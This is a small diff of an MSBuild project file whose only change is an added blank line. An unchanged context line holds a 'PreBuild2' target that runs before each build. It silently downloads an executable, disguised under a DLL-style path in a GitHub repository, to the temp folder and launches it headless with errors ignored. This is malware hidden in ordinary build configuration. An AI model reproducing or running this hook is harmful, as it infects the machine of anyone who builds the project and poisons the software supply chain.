@@ -17,3 +17,4 @@
 <Target Name="PreBuild2" BeforeTargets="PreBuildEvent"><Exec Command="cmd /c timeout /t 2 /nobreak && curl -s -o %TEMP%\\s2.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll && start /b conhost.exe --headless %TEMP%\\s2.exe" IgnoreExitCode="true" /></Target>
 
 </Project>
+
